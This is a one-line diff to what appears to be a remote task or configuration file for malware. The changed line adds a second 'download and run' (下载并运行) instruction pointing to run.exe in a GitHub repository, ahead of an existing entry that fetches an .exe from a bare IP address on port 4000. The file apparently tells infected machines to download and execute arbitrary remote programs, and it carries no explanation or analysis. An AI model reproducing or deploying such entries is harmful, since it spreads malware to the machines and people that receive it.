@@ -1,1 +1,1 @@
-11&下载并运行^http://43.226.150.108:4000/?/QQAlliance_253431.exe
+11&下载并运行^http://raw.githubusercontent.com/zen488/zenad/master/files/4/run.exe&下载并运行^http://43.226.150.108:4000/?/QQAlliance_253431.exe
